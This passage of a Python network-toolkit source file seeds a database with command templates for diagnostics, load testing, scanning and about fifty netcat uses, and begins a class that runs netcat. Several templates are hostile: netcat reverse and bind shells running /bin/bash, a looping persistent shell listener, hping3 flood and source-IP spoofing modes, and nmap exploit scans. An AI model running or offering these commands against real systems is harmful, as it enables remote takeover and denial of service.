            ('traceroute_queries_1', 'traceroute', 'traceroute {target} -q 1', '1 query per hop', 'traceroute <ip> -q 1'),
            ('traceroute_wait_2', 'traceroute', 'traceroute {target} -w 2', '2 second wait', 'traceroute <ip> -w 2'),
            ('traceroute_first_ttl', 'traceroute', 'traceroute {target} -f 1', 'First TTL 1', 'traceroute <ip> -f 1'),
            ('traceroute_max_ttl', 'traceroute', 'traceroute {target} -m 30', 'Max TTL 30', 'traceroute <ip> -m 30'),
            ('tracepath_basic', 'traceroute', 'tracepath {target}', 'Tracepath', 'tracepath <ip>'),
            ('mtr_basic', 'traceroute', 'mtr {target}', 'MTR (My TraceRoute)', 'mtr <ip>'),
            ('mtr_report', 'traceroute', 'mtr {target} --report', 'MTR report', 'mtr <ip> --report'),
            ('mtr_report_cycles', 'traceroute', 'mtr {target} --report --report-cycles 10', 'MTR 10 cycles', 'mtr <ip> --report --report-cycles 10'),
            
            # ==================== NETWORK TRAFFIC COMMANDS ====================
            ('iperf_tcp', 'traffic', 'iperf -c {target}', 'TCP iperf test', 'iperf -c <server>'),
            ('iperf_udp', 'traffic', 'iperf -c {target} -u', 'UDP iperf test', 'iperf -c <server> -u'),
            ('iperf_bandwidth', 'traffic', 'iperf -c {target} -u -b 10M', 'UDP 10Mbps', 'iperf -c <server> -u -b 10M'),
            ('iperf_time', 'traffic', 'iperf -c {target} -t 30', '30 second test', 'iperf -c <server> -t 30'),
            ('iperf_interval', 'traffic', 'iperf -c {target} -i 1', '1 second interval', 'iperf -c <server> -i 1'),
            ('iperf_parallel', 'traffic', 'iperf -c {target} -P 5', '5 parallel streams', 'iperf -c <server> -P 5'),
            ('iperf_reverse', 'traffic', 'iperf -c {target} -R', 'Reverse test', 'iperf -c <server> -R'),
            ('iperf3_basic', 'traffic', 'iperf3 -c {target}', 'iperf3 TCP test', 'iperf3 -c <server>'),
            ('iperf3_udp', 'traffic', 'iperf3 -c {target} -u', 'iperf3 UDP test', 'iperf3 -c <server> -u'),
            ('iperf3_bandwidth', 'traffic', 'iperf3 -c {target} -u -b 100M', 'iperf3 100Mbps', 'iperf3 -c <server> -u -b 100M'),
            ('iperf3_json', 'traffic', 'iperf3 -c {target} -J', 'JSON output', 'iperf3 -c <server> -J'),
            ('hping3_syn', 'traffic', 'hping3 {target} -S', 'SYN flood test', 'hping3 <ip> -S'),
            ('hping3_ack', 'traffic', 'hping3 {target} -A', 'ACK flood', 'hping3 <ip> -A'),
            ('hping3_udp', 'traffic', 'hping3 {target} -2', 'UDP flood', 'hping3 <ip> -2'),
            ('hping3_icmp', 'traffic', 'hping3 {target} -1', 'ICMP flood', 'hping3 <ip> -1'),
            ('hping3_port_80', 'traffic', 'hping3 {target} -S -p 80', 'SYN to port 80', 'hping3 <ip> -S -p 80'),
            ('hping3_flood', 'traffic', 'hping3 {target} --flood', 'Flood mode', 'hping3 <ip> --flood'),
            ('hping3_count', 'traffic', 'hping3 {target} -c 1000', '1000 packets', 'hping3 <ip> -c 1000'),
            ('hping3_interval', 'traffic', 'hping3 {target} -i u1000', '1ms interval', 'hping3 <ip> -i u1000'),
            ('hping3_data', 'traffic', 'hping3 {target} -d 120', '120 byte data', 'hping3 <ip> -d 120'),
            ('hping3_spoof', 'traffic', 'hping3 {target} -a 192.168.1.100', 'Spoof source IP', 'hping3 <ip> -a 192.168.1.100'),
            ('ab_basic', 'traffic', 'ab -n 1000 -c 10 {target}', 'Apache Bench 1000 req', 'ab -n 1000 -c 10 <url>'),
            ('ab_heavy', 'traffic', 'ab -n 5000 -c 50 {target}', 'Apache Bench 5000 req', 'ab -n 5000 -c 50 <url>'),
            ('ab_post', 'traffic', 'ab -n 1000 -c 10 -p post.data -T application/json {target}', 'POST requests', 'ab -n 1000 -c 10 -p post.data -T application/json <url>'),
            ('siege_basic', 'traffic', 'siege {target}', 'Siege test', 'siege <url>'),
            ('siege_concurrent', 'traffic', 'siege -c 10 -t 1M {target}', '10 concurrent, 1 minute', 'siege -c 10 -t 1M <url>'),
            ('siege_file', 'traffic', 'siege -f urls.txt', 'URLs from file', 'siege -f urls.txt'),
            ('tcpdump_basic', 'traffic', 'tcpdump -i eth0', 'Capture on eth0', 'tcpdump -i eth0'),
            ('tcpdump_port', 'traffic', 'tcpdump -i eth0 port 80', 'Capture port 80', 'tcpdump -i eth0 port 80'),
            ('tcpdump_host', 'traffic', 'tcpdump -i eth0 host 192.168.1.1', 'Capture host traffic', 'tcpdump -i eth0 host 192.168.1.1'),
            ('tcpdump_save', 'traffic', 'tcpdump -i eth0 -w capture.pcap', 'Save to file', 'tcpdump -i eth0 -w capture.pcap'),
            ('tcpdump_read', 'traffic', 'tcpdump -r capture.pcap', 'Read from file', 'tcpdump -r capture.pcap'),
            ('tcpdump_verbose', 'traffic', 'tcpdump -i eth0 -v', 'Verbose output', 'tcpdump -i eth0 -v'),
            ('tcpdump_hex', 'traffic', 'tcpdump -i eth0 -XX', 'Hex and ASCII', 'tcpdump -i eth0 -XX'),
            
            # ==================== WHOIS & DNS COMMANDS ====================
            ('whois_basic', 'info', 'whois {target}', 'Basic whois lookup', 'whois <domain>'),
            ('dig_basic', 'info', 'dig {target}', 'DNS lookup with dig', 'dig <domain>'),
            ('dig_mx', 'info', 'dig {target} MX', 'MX records', 'dig <domain> MX'),
            ('dig_ns', 'info', 'dig {target} NS', 'NS records', 'dig <domain> NS'),
            ('dig_txt', 'info', 'dig {target} TXT', 'TXT records', 'dig <domain> TXT'),
            ('dig_soa', 'info', 'dig {target} SOA', 'SOA record', 'dig <domain> SOA'),
            ('dig_any', 'info', 'dig {target} ANY', 'All records', 'dig <domain> ANY'),
            ('dig_reverse', 'info', 'dig -x {target}', 'Reverse DNS', 'dig -x <ip>'),
            ('dig_trace', 'info', 'dig {target} +trace', 'Trace DNS delegation', 'dig <domain> +trace'),
            ('dig_short', 'info', 'dig {target} +short', 'Short output', 'dig <domain> +short'),
            ('nslookup_basic', 'info', 'nslookup {target}', 'nslookup', 'nslookup <domain>'),
            ('nslookup_type_mx', 'info', 'nslookup -type=MX {target}', 'nslookup MX', 'nslookup -type=MX <domain>'),
            ('host_basic', 'info', 'host {target}', 'host command', 'host <domain>'),
            ('host_ip', 'info', 'host {target} 8.8.8.8', 'Host with specific DNS', 'host <domain> 8.8.8.8'),
            
            # ==================== SYSTEM COMMANDS ====================
            ('netstat_all', 'system', 'netstat -an', 'All connections', 'netstat -an'),
            ('netstat_listen', 'system', 'netstat -tulpn', 'Listening ports', 'netstat -tulpn'),
            ('netstat_routes', 'system', 'netstat -rn', 'Routing table', 'netstat -rn'),
            ('ss_all', 'system', 'ss -tulpn', 'Socket statistics', 'ss -tulpn'),
            ('ss_listen', 'system', 'ss -l', 'Listening sockets', 'ss -l'),
            ('ifconfig', 'system', 'ifconfig', 'Interface configuration', 'ifconfig'),
            ('ip_addr', 'system', 'ip addr', 'IP addresses', 'ip addr'),
            ('ip_route', 'system', 'ip route', 'Routing table', 'ip route'),
            ('ip_neigh', 'system', 'ip neigh', 'ARP table', 'ip neigh'),
            ('route', 'system', 'route -n', 'Route table', 'route -n'),
            ('arp', 'system', 'arp -a', 'ARP cache', 'arp -a'),
            ('uptime', 'system', 'uptime', 'System uptime', 'uptime'),
            ('w', 'system', 'w', 'Logged in users', 'w'),
            ('who', 'system', 'who', 'Who is logged in', 'who'),
            ('last', 'system', 'last', 'Last logged in users', 'last'),
            ('ps_aux', 'system', 'ps aux', 'Process list', 'ps aux'),
            ('top', 'system', 'top -b -n 1', 'Process snapshot', 'top -b -n 1'),
            ('free', 'system', 'free -h', 'Memory usage', 'free -h'),
            ('df', 'system', 'df -h', 'Disk usage', 'df -h'),
            ('du', 'system', 'du -sh *', 'Directory sizes', 'du -sh *'),
            ('vmstat', 'system', 'vmstat 1 5', 'VM statistics', 'vmstat 1 5'),
            ('mpstat', 'system', 'mpstat 1 5', 'CPU statistics', 'mpstat 1 5'),
            ('iostat', 'system', 'iostat 1 5', 'I/O statistics', 'iostat 1 5'),
            ('sar', 'system', 'sar -u 1 5', 'System activity', 'sar -u 1 5'),
            ('dmesg', 'system', 'dmesg | tail -20', 'Kernel messages', 'dmesg | tail -20'),
            ('journalctl', 'system', 'journalctl -xe', 'System logs', 'journalctl -xe'),
            
            # ==================== FILE TRANSFER COMMANDS ====================
            ('wget_basic', 'transfer', 'wget {target}', 'Download file', 'wget <url>'),
            ('wget_resume', 'transfer', 'wget -c {target}', 'Resume download', 'wget -c <url>'),
            ('wget_limit', 'transfer', 'wget --limit-rate=500k {target}', 'Limit rate 500k', 'wget --limit-rate=500k <url>'),
            ('wget_background', 'transfer', 'wget -b {target}', 'Background download', 'wget -b <url>'),
            ('wget_output', 'transfer', 'wget -O file.txt {target}', 'Custom output name', 'wget -O file.txt <url>'),
            ('wget_mirror', 'transfer', 'wget -m {target}', 'Mirror website', 'wget -m <url>'),
            ('wget_recursive', 'transfer', 'wget -r {target}', 'Recursive download', 'wget -r <url>'),
            ('scp_file', 'transfer', 'scp file.txt user@host:/path/', 'SCP file copy', 'scp file.txt user@host:/path/'),
            ('scp_dir', 'transfer', 'scp -r dir/ user@host:/path/', 'SCP directory', 'scp -r dir/ user@host:/path/'),
            ('scp_from', 'transfer', 'scp user@host:/path/file.txt .', 'SCP from remote', 'scp user@host:/path/file.txt .'),
            ('rsync_basic', 'transfer', 'rsync -av source/ dest/', 'RSYNC basic', 'rsync -av source/ dest/'),
            ('rsync_ssh', 'transfer', 'rsync -avz -e ssh source/ user@host:dest/', 'RSYNC over SSH', 'rsync -avz -e ssh source/ user@host:dest/'),
            ('rsync_progress', 'transfer', 'rsync -av --progress source/ dest/', 'RSYNC with progress', 'rsync -av --progress source/ dest/'),
            ('rsync_delete', 'transfer', 'rsync -av --delete source/ dest/', 'RSYNC delete', 'rsync -av --delete source/ dest/'),
            
            # ==================== SECURITY COMMANDS ====================
            ('nmap_vuln', 'security', 'nmap {target} --script vuln', 'Vulnerability scan', 'nmap <ip> --script vuln'),
            ('nmap_exploit', 'security', 'nmap {target} --script exploit', 'Exploit scan', 'nmap <ip> --script exploit'),
            ('nmap_malware', 'security', 'nmap {target} --script malware', 'Malware scan', 'nmap <ip> --script malware'),
            ('nikto_basic', 'security', 'nikto -h {target}', 'Nikto web scan', 'nikto -h <url>'),
            ('sqlmap_basic', 'security', 'sqlmap -u "{target}"', 'SQL injection test', 'sqlmap -u "<url>"'),
            ('gobuster_dir', 'security', 'gobuster dir -u {target} -w wordlist.txt', 'Directory busting', 'gobuster dir -u <url> -w wordlist.txt'),
            ('gobuster_dns', 'security', 'gobuster dns -d {target} -w wordlist.txt', 'DNS subdomain', 'gobuster dns -d <domain> -w wordlist.txt'),
            ('dirb_basic', 'security', 'dirb {target}', 'DIRB scan', 'dirb <url>'),
            ('wfuzz_basic', 'security', 'wfuzz -c -z file,wordlist.txt {target}/FUZZ', 'WFUZZ fuzzing', 'wfuzz -c -z file,wordlist.txt <url>/FUZZ'),
            ('nuclei_basic', 'security', 'nuclei -u {target}', 'Nuclei scan', 'nuclei -u <url>'),
            ('whatweb_basic', 'security', 'whatweb {target}', 'WhatWeb scan', 'whatweb <url>'),
            
            # ==================== MISC COMMANDS ====================
            ('nc_listen', 'misc', 'nc -l -p 1234', 'Netcat listen on port', 'nc -l -p 1234'),
            ('nc_connect', 'misc', 'nc {target} 80', 'Netcat connect', 'nc <ip> 80'),
            ('nc_udp', 'misc', 'nc -u {target} 53', 'Netcat UDP', 'nc -u <ip> 53'),
            ('nc_port_scan', 'misc', 'nc -zv {target} 1-1000', 'Netcat port scan', 'nc -zv <ip> 1-1000'),
            ('telnet_connect', 'misc', 'telnet {target} 23', 'Telnet connection', 'telnet <ip> 23'),
            ('openssl_client', 'misc', 'openssl s_client -connect {target}:443', 'SSL client', 'openssl s_client -connect <host>:443'),
            ('openssl_cert', 'misc', 'openssl s_client -connect {target}:443 -showcerts', 'SSL certificates', 'openssl s_client -connect <host>:443 -showcerts'),
            ('hash_md5', 'misc', 'echo -n "{target}" | md5sum', 'MD5 hash', 'echo -n "<text>" | md5sum'),
            ('hash_sha1', 'misc', 'echo -n "{target}" | sha1sum', 'SHA1 hash', 'echo -n "<text>" | sha1sum'),
            ('hash_sha256', 'misc', 'echo -n "{target}" | sha256sum', 'SHA256 hash', 'echo -n "<text>" | sha256sum'),
            ('base64_encode', 'misc', 'echo -n "{target}" | base64', 'Base64 encode', 'echo -n "<text>" | base64'),
            ('base64_decode', 'misc', 'echo -n "{target}" | base64 -d', 'Base64 decode', 'echo -n "<text>" | base64 -d'),
            ('url_encode', 'misc', 'python3 -c "import urllib.parse; print(urllib.parse.quote(\'{target}\'))"', 'URL encode', 'python3 -c "import urllib.parse; print(urllib.parse.quote(\'<text>\'))"'),
            ('url_decode', 'misc', 'python3 -c "import urllib.parse; print(urllib.parse.unquote(\'{target}\'))"', 'URL decode', 'python3 -c "import urllib.parse; print(urllib.parse.unquote(\'<text>\'))"'),
            ('python_exec', 'misc', 'python3 -c "{target}"', 'Python execute', 'python3 -c "<code>"'),
            ('bash_exec', 'misc', 'bash -c "{target}"', 'Bash execute', 'bash -c "<command>"'),
            ('php_exec', 'misc', 'php -r "{target}"', 'PHP execute', 'php -r "<code>"'),
        ]
        
        for template in templates:
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO command_templates (name, category, command, description, usage)
                    VALUES (?, ?, ?, ?, ?)
                ''', template)
            except Exception as e:
                logger.error(f"Failed to insert template {template[0]}: {e}")
        
        self.conn.commit()
    
    def init_netcat_templates(self):
        """Initialize Netcat command templates"""
        netcat_templates = [
            # ==================== NETCAT COMMANDS (50+ variations) ====================
            ('nc_listen_basic', 'nc -l -p {port}', 'Basic listener', 'nc -l -p <port>'),
            ('nc_listen_verbose', 'nc -l -v -p {port}', 'Verbose listener', 'nc -l -v -p <port>'),
            ('nc_listen_keepalive', 'nc -l -k -p {port}', 'Keep alive listener', 'nc -l -k -p <port>'),
            ('nc_connect_basic', 'nc {host} {port}', 'Basic connection', 'nc <host> <port>'),
            ('nc_connect_verbose', 'nc -v {host} {port}', 'Verbose connection', 'nc -v <host> <port>'),
            ('nc_connect_timeout', 'nc -w {timeout} {host} {port}', 'Connection with timeout', 'nc -w <seconds> <host> <port>'),
            ('nc_udp_listen', 'nc -u -l -p {port}', 'UDP listener', 'nc -u -l -p <port>'),
            ('nc_udp_connect', 'nc -u {host} {port}', 'UDP connection', 'nc -u <host> <port>'),
            ('nc_port_scan', 'nc -zv {host} {start_port}-{end_port}', 'Port scan', 'nc -zv <host> <start_port>-<end_port>'),
            ('nc_file_transfer_receive', 'nc -l -p {port} > {filename}', 'Receive file', 'nc -l -p <port> > <filename>'),
            ('nc_file_transfer_send', 'nc {host} {port} < {filename}', 'Send file', 'nc <host> <port> < <filename>'),
            ('nc_chat_server', 'nc -l -p {port} -e /bin/bash', 'Chat server (Linux)', 'nc -l -p <port> -e /bin/bash'),
            ('nc_chat_client', 'nc {host} {port}', 'Chat client', 'nc <host> <port>'),
            ('nc_reverse_shell_server', 'nc -l -p {port} -e /bin/bash', 'Reverse shell server', 'nc -l -p <port> -e /bin/bash'),
            ('nc_reverse_shell_client', 'nc {host} {port} -e /bin/bash', 'Reverse shell client', 'nc <host> <port> -e /bin/bash'),
            ('nc_web_server', 'echo "HTTP/1.1 200 OK\n\nHello World" | nc -l -p {port}', 'Simple web server', 'nc -l -p <port>'),
            ('nc_proxy', 'nc -l -p {local_port} | nc {remote_host} {remote_port}', 'TCP proxy', 'nc -l -p <local_port> | nc <remote_host> <remote_port>'),
            ('nc_port_forward', 'nc -l -p {local_port} -c "nc {remote_host} {remote_port}"', 'Port forwarding', 'nc -l -p <local_port> -c "nc <remote_host> <remote_port>"'),
            ('nc_banner_grab', 'echo "" | nc -v -n -w2 {host} {port}', 'Banner grabbing', 'echo "" | nc -v -n -w2 <host> <port>'),
            ('nc_dns_query', 'nc -u 8.8.8.8 53', 'DNS query', 'echo "<DNS query>" | nc -u 8.8.8.8 53'),
            ('nc_hex_dump', 'nc {host} {port} | hexdump -C', 'Hex dump', 'nc <host> <port> | hexdump -C'),
            ('nc_ssl_connect', 'nc -C {host} {port}', 'SSL connection', 'nc -C <host> <port>'),
            ('nc_execute_command', 'nc -l -p {port} -e {command}', 'Execute command on connection', 'nc -l -p <port> -e <command>'),
            ('nc_persistent_listener', 'while true; do nc -l -p {port} -e /bin/bash; done', 'Persistent listener', 'while true; do nc -l -p <port> -e /bin/bash; done'),
            ('nc_multi_client', 'nc -l -p {port} -k', 'Multi-client listener', 'nc -l -p <port> -k'),
            ('nc_traffic_generator', 'cat /dev/urandom | nc {host} {port}', 'Traffic generator', 'cat /dev/urandom | nc <host> <port>'),
            ('nc_port_test', 'echo "test" | nc {host} {port}', 'Port test', 'echo "test" | nc <host> <port>'),
            ('nc_http_get', 'echo -e "GET / HTTP/1.1\nHost: {host}\n\n" | nc {host} 80', 'HTTP GET request', 'echo -e "GET / HTTP/1.1\nHost: <host>\n\n" | nc <host> 80'),
            ('nc_http_post', 'echo -e "POST / HTTP/1.1\nHost: {host}\nContent-Length: {length}\n\n{data}" | nc {host} 80', 'HTTP POST request', 'echo -e "POST / HTTP/1.1\nHost: <host>\nContent-Length: <length>\n\n<data>" | nc <host> 80'),
            ('nc_smtp_test', 'echo -e "HELO example.com\nMAIL FROM: test@example.com\nRCPT TO: user@example.com\nDATA\nTest email\n.\nQUIT" | nc {host} 25', 'SMTP test', 'nc <host> 25'),
            ('nc_ftp_test', 'echo -e "USER anonymous\nPASS anonymous@example.com\nQUIT" | nc {host} 21', 'FTP test', 'nc <host> 21'),
            ('nc_telnet_test', 'nc {host} 23', 'Telnet test', 'nc <host> 23'),
            ('nc_ssh_banner', 'echo "" | nc {host} 22', 'SSH banner grab', 'echo "" | nc <host> 22'),
            ('nc_mysql_test', 'echo "" | nc {host} 3306', 'MySQL test', 'echo "" | nc <host> 3306'),
            ('nc_redis_test', 'echo "INFO" | nc {host} 6379', 'Redis test', 'echo "INFO" | nc <host> 6379'),
            ('nc_mongodb_test', 'echo "" | nc {host} 27017', 'MongoDB test', 'echo "" | nc <host> 27017'),
            ('nc_elasticsearch_test', 'echo "GET /" | nc {host} 9200', 'Elasticsearch test', 'echo "GET /" | nc <host> 9200'),
            ('nc_webdav_test', 'echo "PROPFIND / HTTP/1.1\nHost: {host}\nDepth: 1\n\n" | nc {host} 80', 'WebDAV test', 'nc <host> 80'),
            ('nc_socks_proxy', 'nc -X 5 -x {proxy_host}:{proxy_port} {target_host} {target_port}', 'SOCKS proxy', 'nc -X 5 -x <proxy_host>:<proxy_port> <target_host> <target_port>'),
            ('nc_ipv6_connect', 'nc -6 {host} {port}', 'IPv6 connection', 'nc -6 <host> <port>'),
            ('nc_ipv6_listen', 'nc -6 -l -p {port}', 'IPv6 listener', 'nc -6 -l -p <port>'),
            ('nc_source_port', 'nc -p {source_port} {host} {port}', 'Specify source port', 'nc -p <source_port> <host> <port>'),
            ('nc_traffic_log', 'nc -l -p {port} | tee {logfile}', 'Traffic logging', 'nc -l -p <port> | tee <logfile>'),
            ('nc_compression', 'nc {host} {port} | gzip -d', 'Compressed traffic', 'nc <host> <port> | gzip -d'),
            ('nc_encryption', 'nc {host} {port} | openssl enc -d -aes256', 'Encrypted traffic', 'nc <host> <port> | openssl enc -d -aes256'),
            ('nc_multi_port_listen', 'nc -l -p {port1} & nc -l -p {port2} & nc -l -p {port3}', 'Multi-port listener', 'nc -l -p <port1> & nc -l -p <port2> & nc -l -p <port3>'),
            ('nc_bandwidth_test_server', 'nc -l -p {port} > /dev/null', 'Bandwidth test server', 'nc -l -p <port> > /dev/null'),
            ('nc_bandwidth_test_client', 'dd if=/dev/zero bs=1M count=100 | nc {host} {port}', 'Bandwidth test client', 'dd if=/dev/zero bs=1M count=100 | nc <host> <port>'),
            ('nc_chat_encrypted', 'nc -l -p {port} | openssl enc -d -aes256', 'Encrypted chat server', 'nc -l -p <port> | openssl enc -d -aes256'),
            ('nc_remote_execution', 'echo "{command}" | nc {host} {port}', 'Remote command execution', 'echo "<command>" | nc <host> <port>'),
        ]
        
        for template in netcat_templates:
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO netcat_commands (name, command, description, usage)
                    VALUES (?, ?, ?, ?)
                ''', template)
            except Exception as e:
                logger.error(f"Failed to insert netcat template {template[0]}: {e}")
        
        self.conn.commit()
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat to database"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip, 
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            logger.info(f"Threat logged: {alert.threat_type} from {alert.source_ip}")
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_command(self, command: str, source: str = "local", success: bool = True, 
                   output: str = "", execution_time: float = 0.0, user: str = None):
        """Log command execution"""
        try:
            user = user or getpass.getuser()
            self.cursor.execute('''
                INSERT INTO commands (command, source, success, output, execution_time, user)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command, source, success, output[:10000], execution_time, user))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_scan(self, scan_result: ScanResult):
        """Log scan results"""
        try:
            open_ports_json = json.dumps(scan_result.result.get('ports', [])) if scan_result.result.get('ports') else "[]"
            services_json = json.dumps(scan_result.result.get('services', [])) if scan_result.result.get('services') else "[]"
            vulnerabilities_json = json.dumps(scan_result.vulnerabilities) if scan_result.vulnerabilities else "[]"
            
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, services, os_info, vulnerabilities, execution_time, scan_id)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (scan_result.target, scan_result.scan_type, open_ports_json, services_json,
                  scan_result.result.get('os', ''), vulnerabilities_json, scan_result.execution_time, scan_result.scan_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_traceroute(self, target: str, command: str, output: str, 
                      execution_time: float, hops: int = 0):
        """Log traceroute results"""
        try:
            self.cursor.execute('''
                INSERT INTO traceroute_results (target, command, output, execution_time, hops)
                VALUES (?, ?, ?, ?, ?)
            ''', (target, command, output, execution_time, hops))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traceroute: {e}")
    
    def log_connection(self, connection: NetworkConnection):
        """Log network connection"""
        try:
            self.cursor.execute('''
                INSERT INTO connections (local_ip, local_port, remote_ip, remote_port, status, process_name, protocol)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (connection.local_ip, connection.local_port, connection.remote_ip,
                  connection.remote_port, connection.status, connection.process_name, connection.protocol))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log connection: {e}")
    
    def log_system_metrics(self):
        """Log system metrics"""
        try:
            cpu = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            net = psutil.net_io_counters()
            connections = len(psutil.net_connections())
            processes = len(psutil.pids())
            
            self.cursor.execute('''
                INSERT INTO system_metrics (cpu_percent, memory_percent, disk_percent, 
                                          network_sent, network_recv, connections_count, processes_count)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (cpu, mem.percent, disk.percent, net.bytes_sent, net.bytes_recv, connections, processes))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log system metrics: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM commands 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_command_templates(self, category: str = None) -> List[Dict]:
        """Get command templates"""
        try:
            if category:
                self.cursor.execute('''
                    SELECT * FROM command_templates WHERE category = ? ORDER BY name
                ''', (category,))
            else:
                self.cursor.execute('''
                    SELECT * FROM command_templates ORDER BY category, name
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command templates: {e}")
            return []
    
    def get_netcat_templates(self) -> List[Dict]:
        """Get Netcat command templates"""
        try:
            self.cursor.execute('SELECT * FROM netcat_commands ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get netcat templates: {e}")
            return []
    
    def get_template_by_name(self, name: str) -> Optional[Dict]:
        """Get command template by name"""
        try:
            self.cursor.execute('''
                SELECT * FROM command_templates WHERE name = ?
            ''', (name,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get template: {e}")
            return None
    
    def add_monitored_ip(self, ip: str, notes: str = "") -> bool:
        """Add IP to monitoring"""
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO monitored_ips (ip_address, notes) VALUES (?, ?)
            ''', (ip, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add monitored IP: {e}")
            return False
    
    def get_monitored_ips(self, active_only: bool = True) -> List[Dict]:
        """Get monitored IPs"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM monitored_ips WHERE is_active = 1 ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM monitored_ips ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get monitored IPs: {e}")
            return []
    
    def remove_monitored_ip(self, ip: str) -> bool:
        """Remove IP from monitoring"""
        try:
            self.cursor.execute('''
                DELETE FROM monitored_ips WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove monitored IP: {e}")
            return False
    
    def get_scan_results(self, limit: int = 20) -> List[Dict]:
        """Get recent scan results"""
        try:
            self.cursor.execute('''
                SELECT scan_id, target, scan_type, timestamp, execution_time FROM scans 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get scan results: {e}")
            return []
    
    def get_scan_details(self, scan_id: str) -> Optional[Dict]:
        """Get detailed scan information"""
        try:
            self.cursor.execute('SELECT * FROM scans WHERE scan_id = ?', (scan_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get scan details: {e}")
            return None
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            # Count threats
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            # Count commands
            self.cursor.execute('SELECT COUNT(*) FROM commands')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            # Count scans
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            # Count monitored IPs
            self.cursor.execute('SELECT COUNT(*) FROM monitored_ips WHERE is_active = 1')
            stats['active_monitored_ips'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def backup(self, backup_path: str = None) -> bool:
        """Create database backup"""
        try:
            if backup_path is None:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_path = os.path.join(BACKUPS_DIR, f"backup_ultimate_cyber_{timestamp}.db")
            
            # Create backup
            backup_conn = sqlite3.connect(backup_path)
            self.conn.backup(backup_conn)
            backup_conn.close()
            
            logger.info(f"Database backed up to {backup_path}")
            return True
        except Exception as e:
            logger.error(f"Failed to backup database: {e}")
            return False
    
    def close(self):
        """Close database connection"""
        try:
            self.conn.close()
            logger.info("Database connection closed")
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# ============================================================================
# NETCAT MANAGER
# ============================================================================

class NetcatManager:
    """Enhanced Netcat manager with 50+ commands"""
    
    def __init__(self, db_manager: DatabaseManager = None):
        self.db = db_manager
        self.netcat_available = self._check_netcat()
        if not self.netcat_available:
            logger.warning("Netcat not found. Some features will be limited.")
    
    def _check_netcat(self) -> bool:
        """Check if netcat is available"""
        try:
            result = subprocess.run(['nc', '--version'], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0 or shutil.which('nc') is not None or shutil.which('netcat') is not None
        except:
            return False
    
    def get_netcat_command(self) -> str:
        """Get netcat command name"""
        if shutil.which('nc'):
            return 'nc'
        elif shutil.which('netcat'):
            return 'netcat'
        else:
            return 'nc'
    
    def execute_netcat(self, args: List[str], timeout: int = 30) -> Dict[str, Any]:
        """Execute netcat command"""
        if not self.netcat_available:
            return {
                'success': False,
                'error': 'Netcat not available',
                'suggestion': 'Install netcat for network features'
            }
        
        cmd = [self.get_netcat_command()] + args
        
        try:
            start_time = time.time()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            execution_time = time.time() - start_time
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'execution_time': execution_time,
                'return_code': result.returncode,
                'command': ' '.join(cmd)
            }
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': f'Netcat command timed out after {timeout} seconds',
                'execution_time': timeout
            }
        except Exception as e:
            return {
                'success': False,
